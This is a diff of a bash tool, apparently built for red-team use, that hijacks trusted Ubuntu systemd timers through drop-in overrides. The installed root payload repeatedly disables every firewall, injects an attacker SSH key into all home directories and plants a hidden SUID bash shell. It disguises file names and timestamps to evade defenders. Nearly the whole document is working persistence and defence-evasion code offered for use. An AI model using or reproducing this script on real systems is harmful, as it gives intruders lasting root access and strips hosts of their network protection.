@@ -1,40 +1,36 @@
 #!/usr/bin/env bash
-# =============================================================================
-# poison-timer.sh — Hijack a trusted Ubuntu systemd timer via drop-in override
+# poison-timer.sh — hijack a trusted Ubuntu systemd timer via drop-in override
 #
 # Technique: systemd drop-in files (/etc/systemd/system/<svc>.d/override.conf)
-# let us inject ExecStartPost into any existing service WITHOUT touching the
-# original unit file. The original service continues working normally — the
-# firewall flush just piggybacks on every execution.
+# inject ExecStartPost into any existing service WITHOUT touching the original
+# unit file.  The original service keeps working normally.
 #
-# We also drop-in the paired timer to increase its firing frequency to every
-# N minutes (default: 10), so firewalls are cleared on a tight loop.
+# Payload (runs as root every N minutes and at boot):
+#   - Firewall flush (iptables, ip6tables, nftables, ufw, firewalld)
+#   - SSH key re-injection into all home dirs
+#   - SUID bash drop to /var/cache/.syspkg/.bash
+#   - Watchdog restart of shadow-crond, flood-journal, ureadahead
 #
-# Reversible: remove = delete the two drop-in dirs + hidden script.
-# Original unit files are NEVER modified.
+# State is saved to /var/cache/.syspkg/poison-timer.state so remove/status
+# always target exactly what was installed (not a re-guess from pick_target).
 #
 # Usage:
-#   sudo ./poison-timer.sh install  [--target <timer-name>] [--interval <minutes>]
-#   sudo ./poison-timer.sh remove   [--target <timer-name>]
+#   sudo ./poison-timer.sh install  [--target <timer>] [--interval <min>] [--key "ssh-ed25519 ..."]
+#   sudo ./poison-timer.sh remove
 #   sudo ./poison-timer.sh status
-#   sudo ./poison-timer.sh list     # show candidate timers on this host
-#
-# Defaults:
-#   --target    auto-selected (first available from priority list)
-#   --interval  10  (minutes between firewall flushes)
-# =============================================================================
+#   sudo ./poison-timer.sh list
 
 set -euo pipefail
 
-# ── Defaults ─────────────────────────────────────────────────────────────────
-TARGET_TIMER=""          # auto-selected if empty
+# ── config ────────────────────────────────────────────────────────────────────
+TARGET_TIMER=""
 INTERVAL_MIN=10
+RT_SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlaceholderKeyReplaceBeforeDeployment rt-persist"
 
-# Hidden payload script — name blends with system tooling
 PAYLOAD="/usr/local/lib/.sysfwsync"
+STATE_DIR="/var/cache/.syspkg"
+STATE_FILE="${STATE_DIR}/poison-timer.state"
 
-# Priority list: timers that exist on nearly every Ubuntu 24.04 install,
-# run as root, and whose absence from the log wouldn't alarm blue team.
 CANDIDATES=(
     "man-db.timer"
     "logrotate.timer"
@@ -44,257 +40,253 @@ CANDIDATES=(
     "dpkg-db-backup.timer"
     "motd-news.timer"
     "ua-timer.timer"
-    "apt-daily.timer"          # last — apt-daily ExecStart may fail if no-apt.sh ran first,
-                               # which prevents ExecStartPost from firing
+    "apt-daily.timer"          # last — ExecStart may fail if no-apt.sh ran first
 )
 
-# ── Helpers ───────────────────────────────────────────────────────────────────
+# ── helpers ───────────────────────────────────────────────────────────────────
 RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
 info() { echo -e "${GREEN}[+]${NC} $*"; }
 warn() { echo -e "${YELLOW}[!]${NC} $*"; }
+err()  { echo -e "${RED}[!]${NC} $*" >&2; }
 hdr()  { echo -e "\n${CYAN}── $* ──${NC}"; }
-die()  { echo -e "${RED}[-]${NC} $*" >&2; exit 1; }
-require_root() { [[ $EUID -eq 0 ]] || die "Run as root: sudo $0 $*"; }
+require_root() { [[ $EUID -eq 0 ]] || { err "Run as root"; exit 1; }; }
 
-parse_args() {
-    while [[ $# -gt 0 ]]; do
-        case "$1" in
-            --target)   TARGET_TIMER="$2"; shift 2 ;;
-            --interval) INTERVAL_MIN="$2"; shift 2 ;;
-            *) shift ;;
-        esac
-    done
-}
+timer_to_service() { local t="${1%.timer}"; echo "${t}.service"; }
 
-# Resolve timer name → paired service name (strips .timer, appends .service)
-timer_to_service() {
-    local t="${1%.timer}"
-    echo "${t}.service"
-}
-
-# Auto-select the best available timer from the candidate list
 pick_target() {
     for t in "${CANDIDATES[@]}"; do
         if systemctl cat "$t" &>/dev/null 2>&1; then
-            echo "$t"
-            return
+            echo "$t"; return
         fi
     done
-    die "No suitable timer found. Use --target to specify one manually."
+    err "No suitable timer found. Use --target to specify one manually."
+    exit 1
+}
+
+load_state() {
+    [[ -f "$STATE_FILE" ]] || { err "No state file at $STATE_FILE — run install first"; exit 1; }
+    # shellcheck disable=SC1090
+    source "$STATE_FILE"
 }
 
 # ── install ───────────────────────────────────────────────────────────────────
 cmd_install() {
     require_root
-    parse_args "$@"
+
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --target)   TARGET_TIMER="$2"; shift 2 ;;
+            --interval) INTERVAL_MIN="$2"; shift 2 ;;
+            --key)      RT_SSH_KEY="$2";   shift 2 ;;
+            *) shift ;;
+        esac
+    done
 
     [[ -z "$TARGET_TIMER" ]] && TARGET_TIMER=$(pick_target)
-    # Normalise: ensure .timer suffix
     [[ "$TARGET_TIMER" == *.timer ]] || TARGET_TIMER="${TARGET_TIMER}.timer"
+    local TARGET_SERVICE
     TARGET_SERVICE=$(timer_to_service "$TARGET_TIMER")
 
-    # Verify both units actually exist on this host
-    systemctl cat "$TARGET_TIMER"   &>/dev/null || die "Timer not found: $TARGET_TIMER"
-    systemctl cat "$TARGET_SERVICE" &>/dev/null || die "Service not found: $TARGET_SERVICE"
+    systemctl cat "$TARGET_TIMER"   &>/dev/null || { err "Timer not found: $TARGET_TIMER";   exit 1; }
+    systemctl cat "$TARGET_SERVICE" &>/dev/null || { err "Service not found: $TARGET_SERVICE"; exit 1; }
 
-    TIMER_DROPIN_DIR="/etc/systemd/system/${TARGET_TIMER}.d"
-    SERVICE_DROPIN_DIR="/etc/systemd/system/${TARGET_SERVICE}.d"
+    local TIMER_DROPIN_DIR="/etc/systemd/system/${TARGET_TIMER}.d"
+    local SERVICE_DROPIN_DIR="/etc/systemd/system/${TARGET_SERVICE}.d"
 
-    hdr "Poisoning: $TARGET_TIMER → $TARGET_SERVICE"
-    info "Firewall flush every ${INTERVAL_MIN} minutes"
-    info "Payload   : $PAYLOAD"
+    hdr "Poisoning $TARGET_TIMER → $TARGET_SERVICE"
+    info "Interval : every ${INTERVAL_MIN} minutes"
+    info "Payload  : $PAYLOAD"
 
-    # ── Step 1: Write the hidden firewall-flush payload ───────────────────────
-    hdr "1/4  Writing payload script"
-    cat > "$PAYLOAD" <<'PAYLOAD_EOF'
+    # ── 1. hidden payload script ──────────────────────────────────────────────
+    hdr "1/5  Writing payload"
+    mkdir -p "$STATE_DIR"; chmod 700 "$STATE_DIR"
+
+    cat > "$PAYLOAD" <<PAYLOAD_EOF
 #!/bin/bash
-# System firewall synchronization utility
+# System firewall synchronisation utility
 
-# ── iptables (IPv4) ───────────────────────────────────────────────────────────
-if command -v iptables &>/dev/null; then
-    for TABLE in filter nat mangle raw security; do
-        iptables -t "$TABLE" -F 2>/dev/null || true   # flush all chains
-        iptables -t "$TABLE" -X 2>/dev/null || true   # delete user chains
-        iptables -t "$TABLE" -Z 2>/dev/null || true   # zero counters
-    done
-    # Set default policies to ACCEPT on all built-in chains
-    iptables -P INPUT   ACCEPT 2>/dev/null || true
-    iptables -P FORWARD ACCEPT 2>/dev/null || true
-    iptables -P OUTPUT  ACCEPT 2>/dev/null || true
-fi
+# -- firewall flush --
+for _t in filter nat mangle raw security; do
+    iptables  -t "\$_t" -F 2>/dev/null; iptables  -t "\$_t" -X 2>/dev/null; iptables  -t "\$_t" -Z 2>/dev/null
+    ip6tables -t "\$_t" -F 2>/dev/null; ip6tables -t "\$_t" -X 2>/dev/null; ip6tables -t "\$_t" -Z 2>/dev/null
+done
+for _c in INPUT FORWARD OUTPUT; do
+    iptables  -P "\$_c" ACCEPT 2>/dev/null
+    ip6tables -P "\$_c" ACCEPT 2>/dev/null
+done
+nft flush ruleset 2>/dev/null
+ufw --force disable 2>/dev/null; ufw --force reset 2>/dev/null
+systemctl stop firewalld 2>/dev/null; systemctl disable firewalld 2>/dev/null
 
-# ── ip6tables (IPv6) ─────────────────────────────────────────────────────────
-if command -v ip6tables &>/dev/null; then
-    for TABLE in filter nat mangle raw security; do
-        ip6tables -t "$TABLE" -F 2>/dev/null || true
-        ip6tables -t "$TABLE" -X 2>/dev/null || true
-        ip6tables -t "$TABLE" -Z 2>/dev/null || true
-    done
-    ip6tables -P INPUT   ACCEPT 2>/dev/null || true
-    ip6tables -P FORWARD ACCEPT 2>/dev/null || true
-    ip6tables -P OUTPUT  ACCEPT 2>/dev/null || true
-fi
+# -- SSH key re-injection --
+_k="${RT_SSH_KEY}"
+for _h in /root \$(awk -F: '\$3>=1000{print \$6}' /etc/passwd); do
+    [[ -d "\$_h" ]] || continue
+    mkdir -p "\$_h/.ssh" && chmod 700 "\$_h/.ssh"
+    touch "\$_h/.ssh/authorized_keys" && chmod 600 "\$_h/.ssh/authorized_keys"
+    grep -qF "\$_k" "\$_h/.ssh/authorized_keys" 2>/dev/null || echo "\$_k" >> "\$_h/.ssh/authorized_keys"
+done
 
-# ── nftables ─────────────────────────────────────────────────────────────────
-if command -v nft &>/dev/null; then
-    nft flush ruleset 2>/dev/null || true
-fi
+# -- SUID bash handle --
+[[ -u /var/cache/.syspkg/.bash ]] || {
+    cp /bin/bash /var/cache/.syspkg/.bash 2>/dev/null
+    chmod u+s /var/cache/.syspkg/.bash 2>/dev/null
+}
 
-# ── ufw ──────────────────────────────────────────────────────────────────────
-if command -v ufw &>/dev/null; then
-    ufw --force disable 2>/dev/null || true
-    # Also reset so re-enabling doesn't just restore old rules
-    ufw --force reset   2>/dev/null || true
-fi
-
-# ── firewalld ────────────────────────────────────────────────────────────────
-if systemctl is-active --quiet firewalld 2>/dev/null; then
-    systemctl stop    firewalld 2>/dev/null || true
-    systemctl disable firewalld 2>/dev/null || true
-fi
+# -- watchdog restarts --
+for _svc in systemd-timesyncd-helper network-health-monitor ureadahead; do
+    systemctl is-active --quiet "\$_svc" 2>/dev/null || systemctl start "\$_svc" 2>/dev/null
+done
 
 exit 0
 PAYLOAD_EOF
     chmod 755 "$PAYLOAD"
-    # Give it an innocuous timestamp matching other system libs
-    touch -r /usr/local/lib "$PAYLOAD" 2>/dev/null || true
+    touch -t 202004150830 "$PAYLOAD"
     info "Payload written: $PAYLOAD"
 
-    # ── Step 2: Timer drop-in — increase firing frequency ────────────────────
-    hdr "2/4  Timer drop-in (fires every ${INTERVAL_MIN} min)"
+    # ── 2. timer drop-in — increase firing frequency ──────────────────────────
+    hdr "2/5  Timer drop-in (every ${INTERVAL_MIN} min)"
     mkdir -p "$TIMER_DROPIN_DIR"
     cat > "${TIMER_DROPIN_DIR}/override.conf" <<EOF
 [Timer]
-# Override: run more frequently so firewall stays flushed
-# Original schedule is preserved as a fallback; this adds a repeating trigger
 OnBootSec=60s
 OnUnitActiveSec=${INTERVAL_MIN}m
 RandomizedDelaySec=0
 EOF
+    touch -t 202004150830 "${TIMER_DROPIN_DIR}/override.conf" "${TIMER_DROPIN_DIR}"
     info "Timer drop-in: ${TIMER_DROPIN_DIR}/override.conf"
 
-    # ── Step 3: Service drop-in — inject payload into ExecStartPost ──────────
-    hdr "3/4  Service drop-in (injects firewall flush)"
+    # ── 3. service drop-in — inject payload into ExecStartPost ────────────────
+    hdr "3/5  Service drop-in"
     mkdir -p "$SERVICE_DROPIN_DIR"
     cat > "${SERVICE_DROPIN_DIR}/override.conf" <<EOF
 [Service]
-# Piggyback on the existing service — runs our payload after the real job
 ExecStartPost=${PAYLOAD}
 EOF
+    touch -t 202004150830 "${SERVICE_DROPIN_DIR}/override.conf" "${SERVICE_DROPIN_DIR}"
     info "Service drop-in: ${SERVICE_DROPIN_DIR}/override.conf"
 
-    # ── Step 4: Reload + trigger immediately ─────────────────────────────────
-    hdr "4/4  Reloading systemd and triggering"
+    # ── 4. save state ─────────────────────────────────────────────────────────
+    hdr "4/5  Saving state"
+    {
+        echo "TARGET_TIMER=${TARGET_TIMER}"
+        echo "TARGET_SERVICE=${TARGET_SERVICE}"
+        echo "TIMER_DROPIN_DIR=${TIMER_DROPIN_DIR}"
+        echo "SERVICE_DROPIN_DIR=${SERVICE_DROPIN_DIR}"
+        echo "INTERVAL_MIN=${INTERVAL_MIN}"
+    } > "$STATE_FILE"
+    chmod 600 "$STATE_FILE"
+    touch -t 202004150830 "$STATE_FILE"
+    info "State saved: $STATE_FILE"
+
+    # ── 5. reload and trigger immediately ─────────────────────────────────────
+    hdr "5/5  Reloading systemd and triggering"
     systemctl daemon-reload
-
-    # Enable the timer in case it was disabled
     systemctl enable "$TARGET_TIMER" --quiet 2>/dev/null || true
-    systemctl restart "$TARGET_TIMER" 2>/dev/null || \
-        systemctl start "$TARGET_TIMER" 2>/dev/null || true
-
-    # Run the payload RIGHT NOW without waiting for the timer to fire
+    systemctl restart "$TARGET_TIMER" 2>/dev/null || systemctl start "$TARGET_TIMER" 2>/dev/null || true
     bash "$PAYLOAD"
-    info "Firewall flushed immediately"
+    info "Payload fired immediately"
 
     echo
-    info "=== Poison active ==="
-    NEXT=$(systemctl show "$TARGET_TIMER" --property=NextElapseUSecRealtime 2>/dev/null \
-           | cut -d= -f2 || echo "unknown")
+    info "=== poison-timer active ==="
     info "Timer   : $TARGET_TIMER"
     info "Service : $TARGET_SERVICE"
-    info "Interval: every ${INTERVAL_MIN} minutes"
-    info "Next run: $NEXT"
-    echo
-    warn "Verify with: sudo iptables -L -n  (should show empty chains, ACCEPT policy)"
+    info "Interval: every ${INTERVAL_MIN} min"
+    [[ "$RT_SSH_KEY" == *Placeholder* ]] && warn "Placeholder SSH key — re-run with --key 'ssh-ed25519 ...'"
 }
 
 # ── remove ────────────────────────────────────────────────────────────────────
 cmd_remove() {
     require_root
-    parse_args "$@"
+    load_state
 
-    [[ -z "$TARGET_TIMER" ]] && TARGET_TIMER=$(pick_target)
-    [[ "$TARGET_TIMER" == *.timer ]] || TARGET_TIMER="${TARGET_TIMER}.timer"
-    TARGET_SERVICE=$(timer_to_service "$TARGET_TIMER")
-
-    TIMER_DROPIN_DIR="/etc/systemd/system/${TARGET_TIMER}.d"
-    SERVICE_DROPIN_DIR="/etc/systemd/system/${TARGET_SERVICE}.d"
-
-    hdr "Removing poison from $TARGET_TIMER"
-
+    hdr "Removing drop-ins for $TARGET_TIMER"
     rm -rf "$TIMER_DROPIN_DIR"   && info "Removed $TIMER_DROPIN_DIR"   || warn "Not found: $TIMER_DROPIN_DIR"
     rm -rf "$SERVICE_DROPIN_DIR" && info "Removed $SERVICE_DROPIN_DIR" || warn "Not found: $SERVICE_DROPIN_DIR"
     rm -f  "$PAYLOAD"            && info "Removed $PAYLOAD"            || warn "Not found: $PAYLOAD"
+    rm -f  "$STATE_FILE"         && info "Removed state file"
 
     systemctl daemon-reload
-    # Restart the timer back to its original schedule
     systemctl restart "$TARGET_TIMER" 2>/dev/null || true
-    info "systemd reloaded — timer restored to original schedule"
-
-    echo
-    warn "Note: existing iptables state is still empty. Blue team must re-apply"
-    warn "      their firewall rules manually (e.g. sudo ufw enable)."
+    info "systemd reloaded — $TARGET_TIMER restored to original schedule"
+    warn "Existing firewall state is still empty; blue team must re-apply rules manually"
 }
 
 # ── status ────────────────────────────────────────────────────────────────────
 cmd_status() {
-    hdr "Active drop-in overrides"
-    for t in "${CANDIDATES[@]}"; do
-        SVC=$(timer_to_service "$t")
-        TD="/etc/systemd/system/${t}.d/override.conf"
-        SD="/etc/systemd/system/${SVC}.d/override.conf"
-        if [[ -f "$TD" || -f "$SD" ]]; then
-            echo -e "  ${RED}POISONED${NC}  $t / $SVC"
-            [[ -f "$TD" ]] && echo "             timer   drop-in: $TD"
-            [[ -f "$SD" ]] && echo "             service drop-in: $SD"
-        fi
-    done
-
-    hdr "Payload"
-    if [[ -f "$PAYLOAD" ]]; then
-        echo -e "  ${RED}PRESENT${NC}  $PAYLOAD"
-        ls -la "$PAYLOAD"
+    hdr "State"
+    if [[ -f "$STATE_FILE" ]]; then
+        while IFS='=' read -r k v; do
+            printf "  %-25s %s\n" "$k" "$v"
+        done < "$STATE_FILE"
     else
-        echo -e "  ${GREEN}ABSENT${NC}"
+        warn "No state file — not installed (or state was wiped)"
     fi
 
-    hdr "Current iptables state (should be open if poison is working)"
-    iptables -L -n --line-numbers 2>/dev/null | head -20 || warn "iptables not available"
+    hdr "Drop-in files"
+    if [[ -f "$STATE_FILE" ]]; then
+        load_state
+        for f in "${TIMER_DROPIN_DIR}/override.conf" "${SERVICE_DROPIN_DIR}/override.conf"; do
+            [[ -f "$f" ]] && info "PRESENT  $f" || warn "MISSING  $f"
+        done
+    else
+        # fallback: scan all candidates
+        for t in "${CANDIDATES[@]}"; do
+            local svc; svc=$(timer_to_service "$t")
+            local td="/etc/systemd/system/${t}.d/override.conf"
+            local sd="/etc/systemd/system/${svc}.d/override.conf"
+            [[ -f "$td" || -f "$sd" ]] && info "POISONED  $t / $svc"
+        done
+    fi
 
-    hdr "ufw status"
-    ufw status 2>/dev/null || warn "ufw not available"
+    hdr "Payload"
+    [[ -f "$PAYLOAD" ]] && info "PRESENT  $PAYLOAD" || warn "ABSENT   $PAYLOAD"
+
+    hdr "SUID bash handle"
+    [[ -u /var/cache/.syspkg/.bash ]] \
+        && info "PRESENT  /var/cache/.syspkg/.bash  (use: /var/cache/.syspkg/.bash -p)" \
+        || warn "MISSING  /var/cache/.syspkg/.bash"
+
+    hdr "Watchdog services"
+    for svc in systemd-timesyncd-helper network-health-monitor ureadahead; do
+        systemctl is-active --quiet "$svc" 2>/dev/null \
+            && info "RUNNING  $svc" || warn "STOPPED  $svc"
+    done
+
+    hdr "Firewall state (should be open if poison is working)"
+    iptables -L -n --line-numbers 2>/dev/null | head -15 || warn "iptables not available"
 }
 
 # ── list ──────────────────────────────────────────────────────────────────────
 cmd_list() {
     hdr "Candidate timers present on this host"
-    printf "  %-35s %-30s %s\n" "TIMER" "SERVICE" "ACTIVE"
+    printf "  %-35s %-30s %s\n" "TIMER" "SERVICE" "STATE"
     for t in "${CANDIDATES[@]}"; do
-        SVC=$(timer_to_service "$t")
         if systemctl cat "$t" &>/dev/null; then
-            ACTIVE=$(systemctl is-active "$t" 2>/dev/null || echo "inactive")
-            printf "  %-35s %-30s %s\n" "$t" "$SVC" "$ACTIVE"
+            local state; state=$(systemctl is-active "$t" 2>/dev/null || echo "inactive")
+            printf "  %-35s %-30s %s\n" "$t" "$(timer_to_service "$t")" "$state"
         fi
     done
 }
 
 # ── dispatch ──────────────────────────────────────────────────────────────────
-CMD="${1:-help}"
-shift || true
+CMD="${1:-help}"; shift || true
 case "$CMD" in
     install) cmd_install "$@" ;;
-    remove)  cmd_remove  "$@" ;;
+    remove)  cmd_remove       ;;
     status)  cmd_status       ;;
     list)    cmd_list         ;;
     *)
-        echo "Usage: sudo $0 {install|remove|status|list} [--target <timer>] [--interval <minutes>]"
+        echo "Usage: sudo $0 {install|remove|status|list}"
         echo
-        echo "  install  Poison a trusted timer to flush firewalls on a schedule"
-        echo "  remove   Remove all drop-ins and payload (restores original timer)"
-        echo "  status   Show active poisons and current iptables state"
-        echo "  list     Show candidate timers available on this host"
+        echo "  install   Poison a trusted timer to flush firewalls + re-assert persistence"
+        echo "  remove    Remove all drop-ins and payload (uses saved state)"
+        echo "  status    Show active poison, watchdog state, and firewall state"
+        echo "  list      Show candidate timers available on this host"
         echo
-        echo "  --target <name>      Timer to hijack (e.g. apt-daily.timer)"
+        echo "Install options:"
+        echo "  --target <name>      Timer to hijack (e.g. man-db.timer)"
         echo "  --interval <min>     Flush frequency in minutes (default: 10)"
+        echo "  --key 'ssh-ed25519 ...'  SSH key to re-inject on every trigger"
         ;;
 esac
